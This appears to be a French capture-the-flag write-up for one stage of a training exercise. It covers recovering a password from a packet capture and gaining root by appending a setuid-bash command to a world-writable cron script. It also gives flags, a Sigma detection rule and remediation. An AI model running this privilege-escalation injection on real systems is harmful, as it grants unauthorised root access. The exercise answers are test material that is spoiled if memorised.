# WRITEUP OFFICIEL // OPÉRATION AEGIS & CHIMERA
## ACTE II : BOX 2 - CORE NEXUS (PIVOT INTERNE & IDENTITÉS)

### 1. Analyse d'Artefacts & Authentification
Dans l'Acte I, nous avions extrait `chimera_beacon.pcap`.
L'analyse des chaînes de caractères révèle :
```bash
strings /home/operator/chimera_beacon.pcap | grep -E "viktor\.k|Pass"
# Authorization: Chimera-Operator viktor.k:V!kt0r_Ch1m3ra_P4ss#2026
```
Le mot de passe de l'opérateur Chimera est `V!kt0r_Ch1m3ra_P4ss#2026`.

### 2. Accès Initial (User Flag)
L'authentification sur Core Nexus avec ces identifiants nous donne accès à la session `operator`.
```bash
cat /home/operator/user.txt
```
Le drapeau dynamique `AEGIS{CORE_NEXUS_USER_PIVOT_<HMAC>}` est obtenu.
On y trouve l'artefact crucial `nexus_auth.sql` contenant la référence :
`VAULT_CIPHER_KEY_AEGIS_99` (nécessaire pour l'Acte III).

### 3. Escalade de Privilèges Root
Vérification des tâches planifiées :
```bash
cat /etc/cron.d/aegis-backup
# */5 * * * * root /opt/maintenance/aegis-backup.sh
ls -l /opt/maintenance/aegis-backup.sh
# -rwxrwxrwx 1 root root ...
```
Le script étant modifiable par n'importe qui, on peut y injecter une commande :
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/maintenance/aegis-backup.sh
# ou alternativement avec sudo / python cap_setuid
```
Après exécution par root (ou invocation directe) :
```bash
cat /root/root.txt
```
Le drapeau dynamique `AEGIS{CORE_NEXUS_ROOT_COMPROMISE_<HMAC>}` est validé.

### 4. Investigation SOC
Recherche dans les logs système :
```bash
grep -i "implant" /var/log/syslog
```
Le script de persistance déposé dans `/tmp/` par Chimera est `chimera_implant_cron.sh`.

### 5. Règle de Détection Sigma
```yaml
title: Unauthorized Modification of Scheduled Maintenance Script
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection:
    TargetFilename|startswith: '/opt/maintenance/'
    TargetFilename|endswith: '.sh'
  condition: selection
level: high
```

### 6. Remédiation
Verrouillage des permissions :
```bash
chmod 0700 /opt/maintenance/aegis-backup.sh
rm -f /tmp/chimera_implant_cron.sh
```
Le système vérifie la conformité des droits et valide la remédiation.
